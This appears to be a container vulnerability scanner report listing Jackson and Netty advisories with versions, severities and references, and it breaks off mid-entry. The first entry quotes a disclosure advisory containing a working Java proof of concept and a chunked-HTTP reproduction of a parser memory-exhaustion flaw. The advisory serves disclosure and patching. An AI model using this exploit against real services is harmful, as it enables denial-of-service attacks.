```yaml
╭ [0] ╭ [0]  ╭ VulnerabilityID : GHSA-r7wm-3cxj-wff9 
│     │      ├ PkgName         : com.fasterxml.jackson.core:jackson-core 
│     │      ├ PkgPath         : openaf/openaf.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.22.0 
│     │      │                  ╰ UID : 348817934bcfb1b0 
│     │      ├ InstalledVersion: 2.22.0 
│     │      ├ FixedVersion    : 2.18.8, 2.21.4, 2.22.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-r7wm-3cxj-wff9 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:688b49468fb20b162d118de6a7ec97cf75947eb57c3dc49aca7e567a17535416 
│     │      ├ Title           : jackson-core: Async parser maxNumberLength bypass via chunked digit
│     │      │                   accumulation (incomplete fix for GHSA-72hv-8253-57qq) 
│     │      ├ Description     : ## Summary
│     │      │                   
│     │      │                   The fix released in jackson-core `2.18.6` and `2.21.1` for
│     │      │                   [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advis
│     │      │                   ories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser,
│     │      │                   published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired
│     │      │                   `validateIntegerLength` into a new `_setIntLength` helper and called it at
│     │      │                   every place where the integer portion of a number is *decided* (terminator
│     │      │                   byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It
│     │      │                    did not call it on the much more attacker-relevant path: "ran out of input
│     │      │                   while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to
│     │      │                   caller".
│     │      │                   As a result, an attacker who streams JSON to a non-blocking parser in many
│     │      │                   small chunks, without ever sending a terminator byte, can keep the parser
│     │      │                   inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely.
│     │      │                   `_textBuffer.expandCurrentSegment()` grows on every chunk, and
│     │      │                   `validateIntegerLength` is never invoked. The accumulator is only gated by
│     │      │                   `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the
│     │      │                   documented `maxNumberLength` (1000 default).
│     │      │                   This is the same vulnerability class, same advisory wording ("Memory
│     │      │                   Exhaustion: Unbounded allocation in TextBuffer from excessively long
│     │      │                   numbers"), same parser class — just the streaming path the original fix didn't
│     │      │                    cover. The fix to the *fraction* path is correct (see `_finishFloatFraction`
│     │      │                   at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where
│     │      │                   `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the
│     │      │                   equivalent call is missing from every integer-digit path.
│     │      │                   ## Affected versions
│     │      │                   Verified on the patched releases:
│     │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
│     │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
│     │      │                   Structurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same
│     │      │                   `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same
│     │      │                   NOT_AVAILABLE returns without validation. Not retested but presumed
│     │      │                   vulnerable.
│     │      │                   ## Affected code
│     │      │                   [`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParse
│     │      │                   rBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/
│     │      │                   java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java)
│     │      │                    in 2.18.6 / 2.21.1.
│     │      │                   ### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:
│     │      │                   ```java
│     │      │                   if (outPtr >= outBuf.length) {
│     │      │                       // NOTE: must expand to ensure contents all in a single buffer (to keep
│     │      │                       // other parts of parsing simpler)
│     │      │                       outBuf = _textBuffer.expandCurrentSegment();
│     │      │                   }
│     │      │                   outBuf[outPtr++] = (char) ch;
│     │      │                   if (++_inputPtr >= _inputEnd) {
│     │      │                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
│     │      │                       _textBuffer.setCurrentLength(outPtr);
│     │      │                       return _updateTokenToNA();          // <-- no
│     │      │                   validateIntegerLength(outPtr)
│     │      │                   ```
│     │      │                   ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
│     │      │                   protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr)
│     │      │                   throws IOException {
│     │      │                       int negMod = _numberNegative ? -1 : 0;
│     │      │                       while (true) {
│     │      │                           if (_inputPtr >= _inputEnd) {
│     │      │                               _minorState = MINOR_NUMBER_INTEGER_DIGITS;
│     │      │                               _textBuffer.setCurrentLength(outPtr);
│     │      │                               return _updateTokenToNA();    // <-- no
│     │      │                   validateIntegerLength(outPtr + negMod)
│     │      │                           }
│     │      │                           int ch = getByteFromBuffer(_inputPtr) & 0xFF;
│     │      │                           if (ch < INT_0) {
│     │      │                               if (ch == INT_PERIOD) {
│     │      │                                   _setIntLength(outPtr+negMod);   // <-- validated here
│     │      │                                   ++_inputPtr;
│     │      │                                   return _startFloat(outBuf, outPtr, ch);
│     │      │                               }
│     │      │                               break;
│     │      │                           if (ch > INT_9) {
│     │      │                               if ((ch | 0x20) == INT_e) {
│     │      │                           ++_inputPtr;
│     │      │                           if (outPtr >= outBuf.length) {
│     │      │                               outBuf = _textBuffer.expandCurrentSegment();
│     │      │                           outBuf[outPtr++] = (char) ch;
│     │      │                       }
│     │      │                       _setIntLength(outPtr+negMod);            // <-- validated here
│     │      │                       return _valueComplete(JsonToken.VALUE_NUMBER_INT);
│     │      │                   The pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467,
│     │      │                   1481, 1586, 1644, 1698 — every "ran out of input mid-integer" exit returns to
│     │      │                   the caller without validating the accumulator length.
│     │      │                   ### Compare with the fraction path that is correct
│     │      │                   `_finishFloatFraction` lines 1827-1838:
│     │      │                   while (loop) {
│     │      │                       if (ch >= INT_0 && ch <= INT_9) {
│     │      │                           ++fractLen;
│     │      │                               _setFractLength(fractLen);          // <-- VALIDATED
│     │      │                               return JsonToken.NOT_AVAILABLE;
│     │      │                           ch = getNextSignedByteFromBuffer();
│     │      │                       ...
│     │      │                   ## Impact
│     │      │                   Reactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON,
│     │      │                   anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or
│     │      │                   `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the
│     │      │                   async parser as they arrive. Operators who set
│     │      │                   `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that
│     │      │                   this caps memory per number value are not getting that guarantee in
│     │      │                   chunked-feed scenarios. The parser silently accumulates digits up to
│     │      │                   `maxStringLength` (20 MiB default) per concurrent connection. Multiply by
│     │      │                   attacker-controlled concurrency to OOM the JVM.
│     │      │                   The synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and
│     │      │                   the async parser on *complete* input are not affected — those paths go through
│     │      │                    `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.
│     │      │                   CWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly
│     │      │                   the same as the parent advisory (Network / Low complexity / High availability
│     │      │                   impact). The parent advisory was scored CVSS 8.7 High.
│     │      │                   ## Proof of concept
│     │      │                   Standalone PoC, no Maven required:
│     │      │                   mkdir poc && cd poc
│     │      │                   curl -sLo jackson-core-2.18.6.jar
│     │      │                   https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/
│     │      │                   jackson-core-2.18.6.jar
│     │      │                   cat > PoC.java <<'EOF'
│     │      │                   import com.fasterxml.jackson.core.*;
│     │      │                   import com.fasterxml.jackson.core.async.ByteArrayFeeder;
│     │      │                   public class PoC {
│     │      │                       public static void main(String[] args) throws Exception {
│     │      │                           StreamReadConstraints strict = StreamReadConstraints.builder()
│     │      │                                   .maxNumberLength(1000)
│     │      │                                   .build();
│     │      │                           JsonFactory f = new JsonFactoryBuilder()
│     │      │                                   .streamReadConstraints(strict)
│     │      │                           // Sanity: synchronous parser rejects 5000-digit int.
│     │      │                           try (JsonParser p = f.createParser("{\"v\":" + "1".repeat(5000) +
│     │      │                   "}")) {
│     │      │                               while (p.nextToken() != null) { /* drive */ }
│     │      │                               System.out.println("[-] BUG ABSENT: sync parser accepted");
│     │      │                               return;
│     │      │                           } catch (Exception e) {
│     │      │                               System.out.println("[+] sync parser rejected 5000-digit int: " +
│     │      │                   e.getClass().getSimpleName());
│     │      │                           // Bug: async parser, chunked, no terminator.
│     │      │                           JsonParser ap = f.createNonBlockingByteArrayParser();
│     │      │                           ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
│     │      │                           byte[] preamble = "{\"v\":".getBytes("UTF-8");
│     │      │                           feeder.feedInput(preamble, 0, preamble.length);
│     │      │                           while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }
│     │      │                           byte[] digits = new byte[16 * 1024];
│     │      │                           for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i %
│     │      │                    9));
│     │      │                           for (int c = 0; c < 600; c++) {
│     │      │                               feeder.feedInput(digits, 0, digits.length);
│     │      │                               JsonToken t = ap.nextToken();
│     │      │                               if (t != JsonToken.NOT_AVAILABLE) {
│     │      │                                   System.out.println("[-] unexpected token: " + t);
│     │      │                                   return;
│     │      │                           System.out.println("[+] BUG PRESENT: async parser accepted ~9.83 MB of
│     │      │                    digits with maxNumberLength=1000");
│     │      │                           // Closing the number now finally triggers the validator.
│     │      │                           feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
│     │      │                           feeder.endOfInput();
│     │      │                           try {
│     │      │                               while (ap.nextToken() != null) { /* drive */ }
│     │      │                               System.out.println("[*] late rejection on close: " +
│     │      │                   e.getMessage().split("\n")[0]);
│     │      │                           ap.close();
│     │      │                   EOF
│     │      │                   javac -cp jackson-core-2.18.6.jar PoC.java
│     │      │                   java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
│     │      │                   Observed output against `jackson-core-2.18.6`:
│     │      │                   [+] sync parser rejected 5000-digit int: StreamConstraintsException
│     │      │                   [+] BUG PRESENT: async parser accepted ~9.83 MB of digits with
│     │      │                   maxNumberLength=1000
│     │      │                   [*] late rejection on close: Number value length (9830400) exceeds the maximum
│     │      │                    allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)
│     │      │                   Observed output against `jackson-core-2.21.1`: identical.
│     │      │                   The 9.83 MB figure is purely a function of the loop bound (600 chunks * 16
│     │      │                   KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy
│     │      │                    declared as `maxNumberLength = 1000`, the parser permits **9830x** more
│     │      │                   allocation than the policy allows. With `maxStringLength` left at the default
│     │      │                   20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap
│     │      │                   (chars are 2 bytes each) before the validator finally fires on
│     │      │                   terminator/`endOfInput()`. Multiply by concurrent connections.
│     │      │                   ## End-to-end reproduction through real HTTP
│     │      │                   Supplements the standalone PoC with a running Spring Boot WebFlux server,
│     │      │                   driving the same bug through the actual reactor-netty + Jackson2JsonDecoder
│     │      │                   streaming-decode path that production reactive endpoints use.
│     │      │                   Setup:
│     │      │                   - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty
│     │      │                   1.1.23)
│     │      │                   - jackson-databind 2.17.2, jackson-core overridden:
│     │      │                     - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest
│     │      │                   published)
│     │      │                     - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch
│     │      │                   - JVM: OpenJDK 17.0.18
│     │      │                   - Server `JsonFactory` configured with
│     │      │                   `StreamReadConstraints.builder().maxNumberLength(1000).build()`
│     │      │                   Endpoint under test exposes the `Flux<DataBuffer>` request body directly to
│     │      │                   `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees
│     │      │                   one
│     │      │                   HTTP chunk per `feedInput` (the same pattern used for any
│     │      │                   `@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket
│     │      │                   HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of 200 digit bytes
│     │      │                   each (50,000 digits total) at 20ms intervals, then writes the closing `}`.
│     │      │                   VULN — jackson-core 2.18.7:
│     │      │                   [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still
│     │      │                   accepting
│     │      │                   [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
│     │      │                   HTTP/1.1 200 OK
│     │      │                   ERR after 6548ms
│     │      │                   cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:
│     │      │                          Number value length (50000) exceeds the maximum allowed (1000, ...)
│     │      │                   Server-side controller trace (250 DataBuffer arrivals elided):
│     │      │                   [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
│     │      │                   [ctrl] DataBuffer arrived size=200 ms=42
│     │      │                   ...
│     │      │                   [ctrl] DataBuffer arrived size=199 ms=5993
│     │      │                   [ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'
│     │      │                   [ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...
│     │      │                   Server held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with
│     │      │                   `maxNumberLength=1000` declared. The validator never fires during streaming;
│     │      │                   it only fires at value-completion when the closing `}` arrives.
│     │      │                   PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
│     │      │                   [PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno
│     │      │                   32] Broken pipe
│     │      │                   [PATCHED-SMALLCHUNK] DONE: digits_sent=2801
│     │      │                   status=connection-broke-mid-stream
│     │      │                   Server-side controller trace:
│     │      │                   [ctrl] DataBuffer arrived size=6   ms=129
│     │      │                   [ctrl] DataBuffer arrived size=200 ms=142
│     │      │                   [ctrl] DataBuffer arrived size=200 ms=145
│     │      │                   [ctrl] DataBuffer arrived size=200 ms=146
│     │      │                   [ctrl] DataBuffer arrived size=200 ms=147
│     │      │                   [ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum
│     │      │                   allowed (1000, ...)
│     │      │                   Patched server raises `StreamConstraintsException` at 155ms after only 5
│     │      │                   DataBuffers, exactly when the accumulated digit count crosses
│     │      │                   `maxNumberLength=1000`. The connection is reset mid-stream rather than the
│     │      │                   parser silently consuming the rest of the attacker's payload.
│     │      │                   Side-by-side:
│     │      │                   | Build | Chunks accepted before exception | Digits buffered | Time to
│     │      │                   detection |
│     │      │                   |---|---|---|---|
│     │      │                   | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit)
│     │      │                    | 6,548ms — only at terminator |
│     │      │                   | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed
│     │      │                   |
│     │      │                   Note on the default `@RequestBody Mono<JsonNode>` path: that path cannot
│     │      │                   distinguish the two builds because Spring's `decodeToMono` joins all
│     │      │                   DataBuffers into one before parsing. The exploitable shape is the
│     │      │                   streaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /
│     │      │                   WebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),
│     │      │                   which is also what `Jackson2Tokenizer` uses for any streaming JSON
│     │      │                   deserialization in WebFlux and Quarkus reactive REST.
│     │      │                   ## Suggested fix
│     │      │                   Mirror the pattern already used in `_finishFloatFraction`. At every site that
│     │      │                   returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState
│     │      │                   = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first.
│     │      │                   Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:
│     │      │                   ```diff
│     │      │                        protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr)
│     │      │                            int negMod = _numberNegative ? -1 : 0;
│     │      │                            while (true) {
│     │      │                                if (_inputPtr >= _inputEnd) {
│     │      │                                    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
│     │      │                                    _textBuffer.setCurrentLength(outPtr);
│     │      │                   +                _streamReadConstraints.validateIntegerLength(outPtr +
│     │      │                   negMod);
│     │      │                                    return _updateTokenToNA();
│     │      │                                }
│     │      │                   Note: `_setIntLength` itself can't be used as-is because it also assigns
│     │      │                   `_intLength`, and `_intLength` must not be set until the integer is truly
│     │      │                   complete (subsequent fraction handling reads `_intLength`). The minimal fix is
│     │      │                    to call only the validator, as shown.
│     │      │                   Apply the same one-line insertion before each `return _updateTokenToNA();`
│     │      │                   that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are
│     │      │                   listed above (12 lines total).
│     │      │                   Alternatively, a heavier refactor: also gate
│     │      │                   `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops
│     │      │                    on `outPtr < maxNumberLength` so that the validator fires at the moment the
│     │      │                   buffer would be enlarged past the limit, rather than waiting for the next
│     │      │                   chunk boundary. Either approach is sufficient.
│     │      │                   ## Credit
│     │      │                   Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the
│     │      │                   Feb 2026 fix for GHSA-72hv-8253-57qq. 
│     │      ├ Severity        : HIGH 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/
│     │      │                         │            SA:N 
│     │      │                         ╰ V40Score : 8.7 
│     │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-core 
│     │      │                  ├ [1]: https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be
│     │      │                  │      1b0b4c3d040fdb9cd 
│     │      │                  ├ [2]: https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d
│     │      │                  │      4a2aad41d47902641 
│     │      │                  ├ [3]: https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66
│     │      │                  │      933cfb82b9aabeef8 
│     │      │                  ├ [4]: https://github.com/FasterXML/jackson-core/pull/1611 
│     │      │                  ╰ [5]: https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-
│     │      │                         3cxj-wff9 
│     │      ├ PublishedDate   : 2026-07-21T21:58:53Z 
│     │      ╰ LastModifiedDate: 2026-07-21T21:58:53Z 
│     ├ [1]  ╭ VulnerabilityID : CVE-2026-54515 
│     │      ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
│     │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
│     │      ├ PkgPath         : openaf/openaf.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.22.0 
│     │      │                  ╰ UID : c3b2e55f064f8b6 
│     │      ├ InstalledVersion: 2.22.0 
│     │      ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:07e5cd1401bd0d0f2954b0cd057edae361ecd06a55fd1b62f07154cc8dd58f1c 
│     │      ├ Title           : jackson-databind: jackson-databind: Ignored properties can be unexpectedly
│     │      │                   modified 
│     │      ├ Description     : jackson-databind contains the general-purpose data-binding functionality and
│     │      │                   tree-model for Jackson Data Processor. From 2.8.0 until 2.18.9, 2.21.5, and
│     │      │                   3.1.4, in BeanDeserializerBase.createContextual(), per-property
│     │      │                   @JsonIgnoreProperties exclusions are applied by _handleByNameInclusion(),
│     │      │                   producing a contextual deserializer whose BeanPropertyMap has the ignored
│     │      │                   properties removed. The subsequent per-property case-insensitivity block
│     │      │                   (triggered by @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds from
│     │      │                   this._beanProperties (the original, unfiltered map) instead of
│     │      │                   contextual._beanProperties, then overwrites the filtered map — restoring every
│     │      │                    property _handleByNameInclusion had just removed. The ignored property
│     │      │                   becomes writable again. This vulnerability is fixed in 2.18.9, 2.21.5, and
│     │      │                   3.1.4. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-915 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
│     │      │                  │        ╰ V3Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
│     │      │                           ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
│     │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
│     │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0e1b0b211f7a53baa62
│     │      │                  │      ba2f4c9bd006c7bf4d5fa 
│     │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5962 
│     │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5964 
│     │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-5
│     │      │                  │      jmj-h7xm-6q6v 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
│     │      ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
│     │      ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
│     ├ [2]  ╭ VulnerabilityID : CVE-2026-59889 
│     │      ├ VendorIDs        ─ [0]: GHSA-5gvw-p9qm-jgwh 
│     │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
│     │      ├ PkgPath         : openaf/openaf.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.22.0 
│     │      │                  ╰ UID : c3b2e55f064f8b6 
│     │      ├ InstalledVersion: 2.22.0 
│     │      ├ FixedVersion    : 2.21.5, 2.18.9, 2.22.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59889 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:4e54b836c95d89396f4d5986208b596e5d89c7a43d8cca9dc56bce597d5898c2 
│     │      ├ Title           : jackson-databind: @JsonView ypassed for @JsonUnwrapped container properties on
│     │      │                    deserialization 
│     │      ├ Description     : jackson-databind contains the general-purpose data-binding functionality and
│     │      │                   tree-model for Jackson Data Processor. From 2.18.0 until 2.18.9, 2.21.5,
│     │      │                   2.22.1, 3.1.5, and 3.2.1, UnwrappedPropertyHandler.processUnwrapped() replays
│     │      │                   buffered JSON for a @JsonUnwrapped property and calls prop.deserializeAndSet()
│     │      │                    without a prop.visibleInView(ctxt.getActiveView()) guard, allowing a property
│     │      │                    annotated with both @JsonView and @JsonUnwrapped to be written from attacker
│     │      │                   JSON under a less-privileged active view. This issue is fixed in versions
│     │      │                   2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-863 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
│     │      │                         ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
│     │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/d627a8a86fcb0624292
│     │      │                  │      82f79f3f256f181ed2c7b 
│     │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/issues/6060 
│     │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/6056 
│     │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-5
│     │      │                  │      gvw-p9qm-jgwh 
│     │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
│     │      ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
│     │      ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
│     ├ [3]  ╭ VulnerabilityID : CVE-2026-59901 
│     │      ├ VendorIDs        ─ [0]: GHSA-558v-64gr-wgg4 
│     │      ├ PkgName         : io.netty:netty-codec-compression 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-compression-4.2.15.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.15.Final 
│     │      │                  ╰ UID : 2e8e76cf94b0172 
│     │      ├ InstalledVersion: 4.2.15.Final 
│     │      ├ FixedVersion    : 4.2.16.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59901 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:b20d9272e13c908d25172abca8ad54d91d48ad987f09929ff475e8492d495ba2 
│     │      ├ Title           : Netty: [Bzip2Decoder] Infinite Loop in RLE State Machine Leads to Event-Loop
│     │      │                   Thread Hang 
│     │      ├ Description     : The `Bzip2Decoder` handler in Netty's compression codec pipeline is vulnerable
│     │      │                    to a denial-of-service attack through a malformed bzip2 stream that
│     │      │                   permanently captures the event-loop thread in an infinite loop. The
│     │      │                   vulnerability exists in the run-length encoding (RLE) state machine within
│     │      │                   [`Bzip2BlockDecompressor.read()`] 
│     │      ├ Severity        : HIGH 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/
│     │      │                         │            SA:N 
│     │      │                         ╰ V40Score : 8.7 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│     │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│     │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHSA-558v-64gr-wgg4 
│     ├ [4]  ╭ VulnerabilityID : GHSA-mfg7-5gfp-c4w3 
│     │      ├ PkgName         : io.netty:netty-codec-dns 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-dns-4.2.15.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.15.Final 
│     │      │                  ╰ UID : 59966438c02b5bf8 
│     │      ├ InstalledVersion: 4.2.15.Final 
│     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-mfg7-5gfp-c4w3 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:8557d8c65bab51198e0e90654f6b16cfd52e32a6c9efea87a50063b106d9baa5 
│     │      ├ Title           : Netty: Memory Leak in DNS Record Decoder via Malformed Domain Names 
│     │      ├ Description     : ### Summary
│     │      │                   A memory leak can be caused in Netty's DNS codec by sending malicious DNS
│     │      │                   packets containing invalid domain names. Because the leak occurs incrementally
│     │      │                    per packet, sustained malicious requests will cause a gradual Denial of
